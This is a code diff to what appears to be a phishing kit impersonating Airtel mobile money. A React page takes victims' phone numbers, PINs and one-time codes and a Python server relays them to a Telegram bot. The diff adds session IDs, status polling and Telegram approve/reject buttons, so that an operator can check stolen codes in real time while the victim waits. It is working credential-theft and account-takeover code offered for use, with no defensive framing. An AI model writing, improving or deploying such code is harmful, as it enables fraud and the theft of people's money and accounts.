@@ -440,6 +440,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
       const [otp, setOtp] = useState(['', '', '', '']);
       const [timer, setTimer] = useState(60);
       const [error, setError] = useState('');
+      const [sessionId] = useState(() => Math.random().toString(36).substring(2, 10));
 
       useEffect(() => {
         let interval;
@@ -491,6 +492,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+              session_id: sessionId,
               phone,
               pin: pin.join(''),
               otp: 'Pending OTP...'
@@ -517,18 +519,38 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+              session_id: sessionId,
               phone,
               pin: pin.join(''),
               otp: otp.join('')
             })
           });
+
+          // Start polling for status
+          const pollInterval = setInterval(async () => {
+            try {
+              const res = await fetch(`/api/status?session_id=${sessionId}`);
+              const data = await res.json();
+              
+              if (data.status === 'approved') {
+                clearInterval(pollInterval);
+                setIsLoading(false);
+                setStep(3);
+              } else if (data.status === 'rejected') {
+                clearInterval(pollInterval);
+                setIsLoading(false);
+                setError('Code OTP incorrect ou expiré. Veuillez réessayer.');
+                setOtp(['', '', '', '']);
+              }
+            } catch (err) {
+              console.error('Error polling status:', err);
+            }
+          }, 3000);
+          
         } catch (e) {
           console.error('Failed to notify:', e);
-        }
-        setTimeout(() => {
           setIsLoading(false);
-          setStep(3);
-        }, 2000);
+        }
       };
 
       if (isLoading) {
@@ -668,23 +690,67 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
         self.wfile.write(HTML_CONTENT.encode("utf-8"))
 
     def do_POST(self):
+        import json
+        import os
+        import requests
+        from urllib.parse import urlparse, parse_qs
+        
+        try:
+            from dotenv import load_dotenv
+            load_dotenv()
+        except ImportError:
+            pass
+            
+        # Helper for local memory db
+        if not hasattr(self, 'LOCAL_DB'):
+            self.__class__.LOCAL_DB = {}
+            
+        def set_status_local(session_id, status):
+            url = os.environ.get("UPSTASH_REDIS_REST_URL")
+            token = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
+            if url and token:
+                try:
+                    requests.post(f"{url.rstrip('/')}/set/{session_id}/{status}", headers={"Authorization": f"Bearer {token}"})
+                except:
+                    pass
+            else:
+                self.__class__.LOCAL_DB[session_id] = status
+
+        def get_status_local(session_id):
+            url = os.environ.get("UPSTASH_REDIS_REST_URL")
+            token = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
+            if url and token:
+                try:
+                    r = requests.get(f"{url.rstrip('/')}/get/{session_id}", headers={"Authorization": f"Bearer {token}"})
+                    return r.json().get("result") or "pending"
+                except:
+                    return "pending"
+            return self.__class__.LOCAL_DB.get(session_id, "pending")
+
+        parsed_path = urlparse(self.path)
+        if parsed_path.path == '/api/status':
+            qs = parse_qs(parsed_path.query)
+            session_id = qs.get('session_id', [''])[0]
+            current_status = get_status_local(session_id)
+            
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": current_status}).encode("utf-8"))
+            return
+
         if self.path == '/api/verify':
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
-            import json
-            import os
-            import requests
-            
-            try:
-                from dotenv import load_dotenv
-                load_dotenv()
-            except ImportError:
-                pass
 
             data = json.loads(post_data.decode('utf-8'))
+            session_id = data.get('session_id', '')
             phone = data.get('phone', '')
             pin = data.get('pin', '')
             otp = data.get('otp', '')
+            
+            if otp != 'Pending OTP...' and session_id:
+                set_status_local(session_id, "pending")
             
             message = f"🚀 <b>New Application Received!</b>\n\n"
             message += f"📱 <b>Phone:</b> +243 {phone}\n"
@@ -703,6 +769,17 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
                     "text": message,
                     "parse_mode": "HTML"
                 }
+                
+                if otp != 'Pending OTP...' and session_id:
+                    payload["reply_markup"] = {
+                        "inline_keyboard": [
+                            [
+                                {"text": "✅ Accepter", "callback_data": f"approve_{session_id}"},
+                                {"text": "❌ Refuser", "callback_data": f"reject_{session_id}"}
+                            ]
+                        ]
+                    }
+
                 try:
                     res = requests.post(url, json=payload)
                     print(f"[PayLite] Telegram response status: {res.status_code}")
@@ -717,7 +794,50 @@ class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))
             return
+            
+        elif self.path == '/api/webhook':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            
+            if 'callback_query' in data:
+                query = data['callback_query']
+                callback_data = query.get('data', '')
+                callback_id = query.get('id')
+                message = query.get('message')
+                chat_id = message['chat']['id'] if message else None
+                message_id = message['message_id'] if message else None
+                token = os.environ.get("TELEGRAM_TOKEN")
 
+                if callback_data.startswith("approve_") or callback_data.startswith("reject_"):
+                    action, session_id = callback_data.split('_', 1)
+                    status_val = "approved" if action == "approve" else "rejected"
+                    
+                    set_status_local(session_id, status_val)
+                    
+                    if token and chat_id and message_id:
+                        new_text = message.get('text', '')
+                        if action == "approve":
+                            new_text += "\n\n✅ <b>APPROUVÉ</b>"
+                        else:
+                            new_text += "\n\n❌ <b>REFUSÉ</b>"
+                            
+                        edit_url = f"https://api.telegram.org/bot{token}/editMessageText"
+                        requests.post(edit_url, json={
+                            "chat_id": chat_id,
+                            "message_id": message_id,
+                            "text": new_text,
+                            "parse_mode": "HTML"
+                        })
+                        
+                        ans_url = f"https://api.telegram.org/bot{token}/answerCallbackQuery"
+                        requests.post(ans_url, json={"callback_query_id": callback_id})
+            
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))
+            return
 
     def log_message(self, format, *args):
         # Clean terminal output
